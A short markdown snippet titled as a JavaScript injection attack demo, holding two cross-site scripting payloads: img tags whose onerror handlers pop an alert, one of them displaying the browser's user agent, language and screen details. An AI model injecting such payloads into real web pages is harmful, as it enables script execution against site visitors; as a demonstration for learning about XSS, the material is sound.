# A Javascript Injection Attack Demo
```html
<img src onerror='alert("THIS IS AN ATTACK")'>
<img src onerror='alert(`Agent: ${navigator.userAgent}\n Language: ${navigator.language}\n Screen Res.: ${screen.width}x${screen.height}\n Color depth: ${screen.colorDepth}`)'>
```